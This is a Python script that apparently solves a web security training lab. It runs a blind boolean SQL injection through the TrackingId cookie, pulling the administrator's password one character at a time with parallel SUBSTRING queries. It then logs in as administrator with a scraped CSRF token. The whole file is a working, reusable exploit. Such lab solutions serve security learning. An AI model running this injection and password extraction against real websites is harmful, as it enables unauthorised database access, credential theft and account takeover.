from lib import (
    SESSION,
    LOGIN_CSRF_XPATH,
    get_csrf_token,
    check_is_lab_solved,
    generate_parser,
)
import re
from string import ascii_lowercase, digits
from multiprocessing import Pool

CHARACTERS = ascii_lowercase + digits


def bruteforce_admin_password(position: int) -> str | None:
    global CHARACTERS

    print(f"[~] Started bruteforcing position {position}")

    for character in CHARACTERS:
        response = SESSION.get(
            f"{lab_url}/",
            cookies={
                "TrackingId": f"{tracking_id}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {position}, 1) = '{character}' --"
            },
        )

        if response.status_code == 200:
            if "Welcome back!" in response.text:
                print(f"[~] Ended bruteforcing position {position}")
                return character

            else:
                continue

    print(f"[~] Ended bruteforcing position {position}")


if __name__ == "__main__":
    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    tracking_id = ""

    print("[!] Fetching the Tracking ID")

    get_set_cookie = SESSION.get(lab_url).headers.get("Set-Cookie")

    if get_set_cookie:
        match = re.search(r"TrackingId=(.+?);", get_set_cookie)
        if match:
            tracking_id = match.group(1)

    if not tracking_id:
        print("[-] Failed to get tracking_id")
        exit()

    print(f"[+] Got the Tracking ID: {tracking_id}")

    print("[!] Now brute-forcing the `administrator` password")

    administrator_password = ""
    function_args = list(range(1, 30))

    with Pool(10) as p:
        for arg, result in zip(
            function_args, p.imap(bruteforce_admin_password, function_args)
        ):
            if result is None:
                print(f"[+] Function returned None for input {arg}, stopping early.")
                p.terminate()
                break

            administrator_password += result

    print(f"[+] Found the `administrator` password: {administrator_password}")

    print("[+] Now logging in as administrator")

    # Extracting the login form csrf token using xpath
    login_csrf_token = get_csrf_token(
        # Fetching the login page to get the login page csrf token and parsing it with lxml to generate a tree
        SESSION.get(url=f"{lab_url}/login").text,
        LOGIN_CSRF_XPATH,
    )
    print(f"[+] Login CSRF Token: {login_csrf_token}")

    if (
        SESSION.post(
            url=f"{lab_url}/login",
            data={
                "username": "administrator",
                "password": administrator_password,
                "csrf": login_csrf_token,
            },
        ).status_code
        == 200
    ):
        print("[+] Logged in as administrator successfully")
    else:
        print("[-] Failed to login as administrator")
        exit()

    check_is_lab_solved(lab_url)
